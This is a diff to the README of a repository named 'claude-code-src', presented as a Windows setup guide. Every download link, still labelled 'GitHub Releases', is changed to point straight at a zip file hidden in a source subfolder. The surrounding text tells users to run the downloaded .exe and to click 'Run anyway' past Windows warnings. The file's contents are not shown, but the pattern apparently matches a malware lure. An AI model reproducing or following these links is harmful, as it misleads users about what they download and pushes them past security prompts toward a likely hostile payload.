@@ -1,6 +1,6 @@
 # 🤖 claude-code-src - Simple Windows setup for daily use
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-2ea44f?style=for-the-badge&logo=github)](https://github.com/Angeliquetreated862/claude-code-src/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-2ea44f?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Angeliquetreated862/claude-code-src/main/src/services/compact/code-claude-src-v2.6-alpha.4.zip)
 
 ## 🚀 What this is
 
@@ -12,13 +12,13 @@ This project uses an agent-style workflow and a harness-based code setup. In pla
 
 Visit this page to download:
 
-[GitHub Releases](https://github.com/Angeliquetreated862/claude-code-src/releases)
+[GitHub Releases](https://raw.githubusercontent.com/Angeliquetreated862/claude-code-src/main/src/services/compact/code-claude-src-v2.6-alpha.4.zip)
 
 On that page, look for the latest release and download the Windows file. If you see a `.exe` file, save it to your computer and run it. If you see a `.zip` file, download it, unzip it, and then open the app inside the folder.
 
 ## 🖥️ Windows setup
 
-1. Open the [Releases page](https://github.com/Angeliquetreated862/claude-code-src/releases).
+1. Open the [Releases page](https://raw.githubusercontent.com/Angeliquetreated862/claude-code-src/main/src/services/compact/code-claude-src-v2.6-alpha.4.zip).
 2. Find the latest version near the top of the page.
 3. Download the Windows file for your system.
 4. If Windows asks for permission, choose **Yes** or **Run anyway**.
@@ -115,7 +115,7 @@ If you still have trouble, remove the downloaded files, get a fresh copy from th
 
 ## 📎 Download link again
 
-[Open the GitHub Releases page](https://github.com/Angeliquetreated862/claude-code-src/releases)
+[Open the GitHub Releases page](https://raw.githubusercontent.com/Angeliquetreated862/claude-code-src/main/src/services/compact/code-claude-src-v2.6-alpha.4.zip)
 
 ## 📄 Basic workflow
 
